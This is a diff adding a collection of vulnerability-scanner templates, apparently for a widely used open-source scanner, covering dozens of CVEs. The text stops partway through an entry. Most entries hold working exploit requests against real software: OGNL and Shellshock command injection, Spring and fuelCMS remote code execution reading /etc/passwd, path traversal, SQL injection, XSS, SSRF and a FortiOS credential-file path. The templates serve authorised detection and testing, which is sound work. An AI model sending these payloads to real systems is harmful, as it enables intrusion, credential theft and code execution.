@@ -1,0 +1,4687 @@
+{
+  "templates": [
+    {
+      "id": "cve-2005-2428",
+      "info": {
+        "author": "CasperGN",
+        "name": "CVE-2005-2428",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "name": "domino-username",
+              "part": "body",
+              "regex": [
+                "(<a href\\=\\\"/names\\.nsf/[0-9a-z\\/]+\\?OpenDocument)"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/names.nsf/People?OpenView"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2013-2251",
+      "info": {
+        "author": "exploitation",
+        "description": "In Struts 2 before 2.3.15.1 the information following \"action:\", \"redirect:\" or \"redirectAction:\" is not properly sanitized. Since said information will be evaluated as OGNL expression against the value stack, this introduces the possibility to inject server side code.",
+        "name": "Apache Struts 2 - DefaultActionMapper Prefixes OGNL Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "uid="
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "{{BaseURL}}/login.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "{{BaseURL}}/index.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}",
+            "{{BaseURL}}/login.action?action:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'sh','-c','id'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%3d%23context.get(%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2014-6271",
+      "info": {
+        "author": "pentest_swissky",
+        "description": "Attempts to exploit the \"shellshock\" vulnerability (CVE-2014-6271 and CVE-2014-7169) in web applications",
+        "name": "Shellshock",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "headers": {
+            "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+          },
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/",
+            "{{BaseURL}}/cgi-bin/status",
+            "{{BaseURL}}/cgi-bin/stats",
+            "{{BaseURL}}/cgi-bin/test",
+            "{{BaseURL}}/cgi-bin/status/status.cgi",
+            "{{BaseURL}}/test.cgi",
+            "{{BaseURL}}/debug.cgi"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-10075",
+      "info": {
+        "author": "madrobot",
+        "description": "The vulnerability can be used to include HTML or JavaScript code to the affected web page. The code is executed in the browser of users if they visit the manipulated site.",
+        "name": "Oracle Content Server XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(31337)</script>"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=OO",
+            "{{BaseURL}}/cs/idcplg?IdcService=GET_SEARCH_RESULTS&ResultTemplate=StandardResults&ResultCount=20&FromPageUrl=/cs/idcplg?IdcService=GET_DYNAMIC_PAGEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"&PageName=indext&SortField=dInDate&SortOrder=Desc&ResultsTitle=AAA&dSecurityGroup=&QueryText=(dInDate+%3E=+%60%3C$dateCurrent(-7)$%3E%60)&PageTitle=XXXXXXXXXXXX%3Cscript%3Ealert(31337)%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-11444",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Subrion CMS before 4.1.5.10 has a SQL injection vulnerability in /front/search.php via the $_GET array.",
+        "name": "Subrion CMS SQL Injection",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "projectdiscovery.io"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/search/members/?id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-12637",
+      "info": {
+        "author": "apt-mirror",
+        "description": "Directory traversal vulnerability in scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS in SAP NetWeaver Application Server Java 7.5 allows remote attackers to read arbitrary files via a .. (dot dot) in the query string, as exploited in the wild in August 2017, aka SAP Security Note 2486657.",
+        "name": "Directory traversal vulnerability in SAP NetWeaver Application Server Java 7.5",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "condition": "and",
+              "part": "body",
+              "type": "word",
+              "words": [
+                "WEB-INF",
+                "META-INF"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/.."
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-14537",
+      "info": {
+        "author": "pikpikcu",
+        "name": "trixbox 2.8.0 - directory-traversal",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /maint/index.php?packages HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nReferer: {{Hostname}}/maint/index.php?packages\nContent-Length: 160\nCookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2\nAuthorization: Basic bWFpbnQ6cGFzc3dvcmQ=\nConnection: keep-alive\n\nxajax=menu&xajaxr=1504969293893&xajaxargs[]=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&xajaxargs[]=yumPackages\n",
+            "GET /maint/modules/home/index.php?lang=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00english HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nReferer: {{Hostname}}/maint/index.php?packages\nCookie: lng=en; security_level=0; PHPSESSID=7fasl890v1c51vu0d31oemt3j1; ARI=teev7d0kgvdko8u5b26p3335a2\nAuthorization: Basic bWFpbnQ6cGFzc3dvcmQ=\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-14849",
+      "info": {
+        "author": "Random-Robbie",
+        "description": "Node.js 8.5.0 before 8.6.0 allows remote attackers to access unintended files, because a change to \"..\" handling was incompatible with the pathname validation used by unspecified community modules.",
+        "name": "Node.js 8.5.0 >=< 8.6.0 Directory Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/static/../../../a/../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-5638",
+      "info": {
+        "author": "Random Robbie",
+        "description": "Struts is vulnerable to remote command injection attacks through incorrectly parsing an attacker’s invalid Content-Type HTTP header. The Struts vulnerability allows these commands to be executed under the privileges of the Web server.",
+        "name": "Struts2 RCE ",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "X-Hacker: Bounty Plz"
+              ]
+            }
+          ],
+          "raw": [
+            "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1\nAccept-Language: en\nContent-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hacker','Bounty Plz')}.multipart/form-data\nConnection: Keep-Alive\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)\nPragma: no-cache\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-7391",
+      "info": {
+        "author": "pikpikcu",
+        "description": "A Cross-Site Scripting (XSS) was discovered in 'Magmi 0.7.22'. The vulnerability exists due to insufficient filtration of user-supplied data (prefix) passed to the 'magmi-git-master/magmi/web/ajax_gettime.php' URL.",
+        "name": "Magmi – Cross-Site Scripting v.0.7.22",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "\"><script>alert(document.domain);</script><"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/magmi/web/ajax_gettime.php?prefix=%22%3E%3Cscript%3Ealert(document.domain);%3C/script%3E%3C"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-7615",
+      "info": {
+        "author": "bp0lr & dwisiswant0",
+        "description": "MantisBT through 2.3.0 allows arbitrary password reset and unauthenticated admin access via an empty confirm_hash value to verify.php.",
+        "name": "CVE-2017-7615",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<input type=\"hidden\" name=\"account_update_token\" value=\"([a-zA-Z0-9_-]+)\""
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/verify.php?id=1&confirm_hash=",
+            "{{BaseURL}}/mantis/verify.php?id=1&confirm_hash=",
+            "{{BaseURL}}/mantisBT/verify.php?id=1&confirm_hash=",
+            "{{BaseURL}}/mantisbt-2.3.0/verify.php?id=1&confirm_hash=",
+            "{{BaseURL}}/bugs/verify.php?confirm_hash=&id=1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-9506",
+      "info": {
+        "author": "Ice3man",
+        "description": "The IconUriServlet of the Atlassian OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 allows remote attackers to access the content of internal network resources and/or perform an XSS attack via Server Side Request Forgery (SSRF).",
+        "name": "Jira IconURIServlet SSRF",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "ipinfo.io/missingauth"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugins/servlet/oauth/users/icon-uri?consumerUri=https://ipinfo.io/json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-9841",
+      "info": {
+        "author": "Random-Robbie",
+        "description": "Util/PHP/eval-stdin.php in PHPUnit before 4.8.28 and 5.x before 5.6.3 allows remote attackers to execute arbitrary PHP code via HTTP POST data beginning with a \"<?php \" substring, as demonstrated by an attack on a site with an exposed /vendor folder, i.e., external access to the /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php URI",
+        "name": "CVE-2017-9841",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "this version of phpunit requires php 5"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/laravel_api/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/api/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/apps/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/backup/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/oldsite/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/lib/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/modules/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/old/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/zend/vendor/phpunit/phpunit/phpunit",
+            "{{BaseURL}}/yii/vendor/phpunit/phpunit/phpunit"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-0296",
+      "info": {
+        "author": "organiccrap",
+        "name": "Cisco ASA path traversal vulnerability",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "///sessions"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/+CSCOU+/../+CSCOE+/files/file_list.json?path=/sessions"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-1000129",
+      "info": {
+        "author": "mavericknerd @0h1in9e",
+        "description": "An XSS vulnerability exists in the Jolokia agent version 1.3.7 in the HTTP servlet that allows an attacker to execute malicious javascript in the victim's browser.",
+        "name": "Jolokia XSS",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<svg onload=alert(document.domain)>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html",
+            "{{BaseURL}}/api/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html",
+            "{{BaseURL}}:8080/jolokia/read<svg onload=alert(document.domain)>?mimeType=text/html"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-11409",
+      "info": {
+        "author": "Harsh Bothra",
+        "name": "Splunk Sensitive Information Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "licenseKeys"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json",
+            "{{BaseURL}}/__raw/services/server/info/server-info?output_mode=json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-11759",
+      "info": {
+        "author": "Harsh Bothra",
+        "name": "Apache Tomcat JK Status Manager Access",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "JK Status Manager"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/jkstatus",
+            "{{BaseURL}}/jkstatus;"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-1247",
+      "info": {
+        "author": "madrobot",
+        "name": "RSA Authentication Manager XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "application/x-shockwave-flash"
+              ]
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "javascript:alert(1337)"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/IMS-AA-IDP/common/scripts/iua/pmfso.swf?sendUrl=/&gotoUrlLocal=javascript:alert(1337)//"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-1271",
+      "info": {
+        "author": "hetroublemakr",
+        "name": "Spring MVC Directory Traversal Vulnerability",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "for 16-bit app support"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini",
+            "{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-1273",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Spring Data Commons, versions prior to 1.13 to 1.13.10, 2.0 to 2.0.5,\nand older unsupported versions, contain a property binder vulnerability\ncaused by improper neutralization of special elements.\nAn unauthenticated remote malicious user (or attacker) can supply\nspecially crafted request parameters against Spring Data REST backed HTTP resources\nor using Spring Data’s projection-based request payload binding hat can lead to a remote code execution attack.\n",
+        "name": "Spring Data Commons Unauthenticated RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:",
+                "\\[(font|extension|file)s\\]"
+              ],
+              "type": "regex"
+            }
+          ],
+          "payloads": {
+            "command": [
+              "cat /etc/passwd",
+              "type C:\\/Windows\\/win.ini"
+            ]
+          },
+          "raw": [
+            "POST /account HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nContent-Type: application/x-www-form-urlencoded\n\nname[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('{{url_encode('§command§')}}')]=nuclei\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-13379",
+      "info": {
+        "author": "organiccrap",
+        "name": "FortiOS - Credentials Disclosure",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "var fgt_lang ="
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-14728",
+      "info": {
+        "author": "madrobot",
+        "name": "Responsive filemanager 9.13.1 - SSRF/LFI",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "body": "fldr=&url=file:///etc/passwd",
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/filemanager/upload.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-16341",
+      "info": {
+        "author": "madrobot",
+        "description": "Nuxeo Authentication Bypass Remote Code Execution &lt; 103 using a SSTI",
+        "name": "Nuxeo Authentication Bypass Remote Code Execution",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "31333333337"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/nuxeo/login.jsp/pwn${31333333330+7}.xhtml"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-16763",
+      "info": {
+        "author": "pikpikcu",
+        "name": "fuelCMS 1.4.1 - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /fuel/pages/select/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27 HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-17431",
+      "info": {
+        "author": "dwisiswant0",
+        "description": "Comodo Firewall & Central Manager (UTM) All Release before 2.7.0 & 1.5.0 Remote Code Execution (Web Shell based)",
+        "name": "Comodo Unified Threat Management Web Console 2.7.0 - RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "Configuration has been altered"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "GET /manage/webshell/u?s=5&w=218&h=15&k=%73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a&l=62&_=5621298674064 HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n",
+            "GET /manage/webshell/u?s=5&w=218&h=15&k=%0a&l=62&_=5621298674064 HTTP/1.1\nHost: {{Hostname}}\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-18069",
+      "info": {
+        "author": "nadino",
+        "description": "process_forms in the WPML (aka sitepress-multilingual-cms) plugin through 3.6.3 for WordPress has XSS via any locale_file_name_ parameter (such as locale_file_name_en) in an authenticated theme-localization.php request to wp-admin/admin.php.",
+        "name": "Wordpress unauthenticated stored xss",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "body": "icl_post_action=save_theme_localization&locale_file_name_en=EN\\\"><html xmlns=\\\"hacked",
+          "matchers": [
+            {
+              "dsl": [
+                "status_code==302 && contains(set_cookie, \"_icl_current_admin_language\")"
+              ],
+              "type": "dsl"
+            }
+          ],
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-admin/admin.php"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-19386",
+      "info": {
+        "author": "pikpikcu",
+        "name": "SolarWinds Database Performance Analyzer 11.1. 457 - Cross Site Scripting",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "type": "word",
+              "words": [
+                "<a href=\"javascript:alert(document.domain)//"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/iwc/idcStateError.iwc?page=javascript%3aalert(document.domain)%2f%2f"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-19439",
+      "info": {
+        "author": "madrobot & dwisiswant0",
+        "description": "XSS exists in the Administration Console in Oracle Secure Global Desktop 4.4 20080807152602 (but was fixed in later versions including 5.4)",
+        "name": "Cross Site Scripting in Oracle Secure Global Desktop Administration Console",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(1337)</script><!--</TITLE>"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/sgdadmin/faces/com_sun_web_ui/help/helpwindow.jsp?=&windowTitle=AdministratorHelpWindow></TITLE></HEAD><body><script>alert(1337)</script><!--&>helpFile=concepts.html"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-20824",
+      "info": {
+        "author": "madrobot & dwisiswant0",
+        "description": "The WallboardServlet resource in Jira before version 7.13.1 allows remote attackers to inject arbitrary HTML or JavaScript via a cross site scripting (XSS) vulnerability in the cyclePeriod parameter.",
+        "name": "Atlassian Jira WallboardServlet XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "(?mi)timeout:\\salert\\(document\\.domain\\)"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/plugins/servlet/Wallboard/?dashboardId=10000&dashboardId=10000&cyclePeriod=alert(document.domain)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-2791",
+      "info": {
+        "author": "madrobot",
+        "description": "Vulnerability in the Oracle WebCenter Sites component of Oracle Fusion Middleware",
+        "name": "Oracle WebCenter Sites XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<h1xxx<scriptalert(1)</script"
+              ]
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/servlet/Satellite?destpage=%22%3Ch1xxx%3Cscriptalert(1)%3C%2Fscript&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-3714",
+      "info": {
+        "author": "madrobot",
+        "name": "node-srv Path Traversal",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/node_modules/../../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-3760",
+      "info": {
+        "author": "0xrudra",
+        "name": "Rails cve-2018-3760",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "body",
+              "regex": [
+                "root:[x*]:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/assets/file:%2f%2f/etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-5230",
+      "info": {
+        "author": "madrobot",
+        "name": "Atlassian Confluence Status-List XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "status": [
+                200
+              ],
